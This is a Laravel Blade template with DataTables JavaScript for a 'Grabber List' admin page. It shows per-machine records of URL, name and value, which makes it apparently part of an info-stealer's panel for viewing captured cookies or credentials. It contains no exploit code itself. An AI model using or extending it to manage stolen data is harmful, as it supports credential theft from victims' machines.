@extends('pages.layout')

@section('content')

    <div class="content-wrapper">
        <!-- Content -->

        <div class="container-fluid flex-grow-1 container-p-y">
            <!-- Users List Table -->
            <div class="card">
                <h5 class="card-header">Grabber List</h5>
                <div class="card-datatable table-responsive">
                    <table id="table" class="datatables-users table border-top">
                        <thead>
                        <tr>
                            <th>UUID</th>
                            <th>URL</th>
                            <th>Name</th>
                            <th>Value</th>
                            <th>Date</th>
                            <th></th>
                        </tr>
                        </thead>
                    </table>
                </div>
            </div>
        </div>
        <!-- / Content -->
    </div>

    <script>
        const url = '{{ route('grabber.items') }}'

        $('#table').DataTable({
            responsive: true,
            searchDelay: 500,
            processing: true,
            serverSide: true,
            ajax: url,
            columns: [
                {data: 'id'},
                {data: 'url'},
                {data: 'name'},
                {data: 'value'},
                {data: 'created_at'},
            ],
            order: [
                [4, 'desc']
            ],
            columnDefs: [
                {
                    targets: 0,
                    visible: true,
                    render: function (data, type, full, meta) {
                        let editUrl = '{{ route("machines.info", ":id") }}';
                        editUrl = editUrl.replace(':id', full.machine.id);

                        return `<a href="${editUrl}">${full.machine.uuid}</a>`
                    }
                },
                {
                    targets: 1,
                    visible: true
                },
                {
                    targets: 2,
                    visible: true
                },
                {
                    targets: 3,
                    visible: true
                },
                {
                    targets: 4,
                    visible: true,
                    render: function (data, type, full, meta) {
                        return new Date(full.created_at).toLocaleString()
                    }
                },
            ],
            dom: '<"row"<"col-sm-12 col-md-6"l><"col-sm-12 col-md-6 d-flex justify-content-center justify-content-md-end"f>>t<"row"<"col-sm-12 col-md-6"i><"col-sm-12 col-md-6"p>>'
        })
    </script>
@endsection
